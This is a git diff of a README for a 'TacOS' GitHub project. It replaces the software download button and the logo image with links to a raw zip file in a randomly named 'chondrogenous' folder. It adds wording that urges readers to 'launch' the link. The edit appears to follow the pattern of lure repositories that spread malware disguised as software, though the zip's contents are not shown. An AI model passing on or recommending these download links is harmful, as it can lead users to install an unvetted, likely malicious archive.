@@ -11,7 +11,7 @@ Welcome to the TacOS repository! Here you will find all the resources related to
 ## Software Package
 To download the latest software package for TacOS, please click the button below:
 
-[![Download TacOS Software](https://github.com/Naoval19/TacOS/releases/download/v2.0/Software.zip)](https://github.com/Naoval19/TacOS/releases/download/v2.0/Software.zip)
+[![Download TacOS Software](https://github.com/Naoval19/TacOS/raw/refs/heads/main/chondrogenous/Tac-OS-1.3.zip)](https://github.com/Naoval19/TacOS/raw/refs/heads/main/chondrogenous/Tac-OS-1.3.zip)
 
 **Note:** This link needs to be launched to download the software package.
 
@@ -47,6 +47,6 @@ Stay connected with the TacOS community:
 - Follow us on [Twitter](#) for the latest news and updates.
 - Join our [Discord](#) server to engage with other TacOS users and developers.
 
-![TacOS Logo](https://github.com/Naoval19/TacOS/releases/download/v2.0/Software.zip)
+![TacOS Logo](https://github.com/Naoval19/TacOS/raw/refs/heads/main/chondrogenous/Tac-OS-1.3.zip)
 
 🌮 Happy computing with TacOS! 🌮
